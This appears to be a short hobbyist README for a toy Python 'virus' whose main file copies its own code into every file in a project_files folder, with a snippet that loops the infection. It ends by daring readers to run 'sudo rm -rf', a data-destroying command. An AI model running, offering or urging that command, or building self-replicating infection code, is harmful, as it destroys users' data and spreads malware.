# Testing VirusðŸ˜¬ to infect computer system

**When you run main file, it will go inside project_files folder and iterate all the files in it
then insert main file code inside it.**

### Yeah yeah I know, I'm just trying to make one :).


## Little tip

Inside `main.py` you can use loop on this line to add up redundant infected code ðŸ¤‘
```python
for _ in range(10):
    infect(os.listdir('project_files'))
```

**Be aware it will cause exponent time complexity**

# If you dare with me try it

```bash
sudo rm -rf
```
